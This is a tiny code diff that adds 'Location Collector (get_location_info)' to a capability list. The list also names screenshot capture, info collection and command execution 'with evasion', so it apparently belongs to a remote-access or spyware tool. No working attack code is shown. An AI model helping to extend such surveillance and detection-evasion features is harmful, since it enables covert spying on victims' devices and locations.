@@ -47,6 +47,7 @@ CAPABILITIES = {
     4: "Screenshot (start_screenshot)",
     5: "Info Collector (start_info_collector)",
     6: "Command Executor (execute_command_with_evasion)",
+    7: "Location Collector (get_location_info)",
 }
 
 
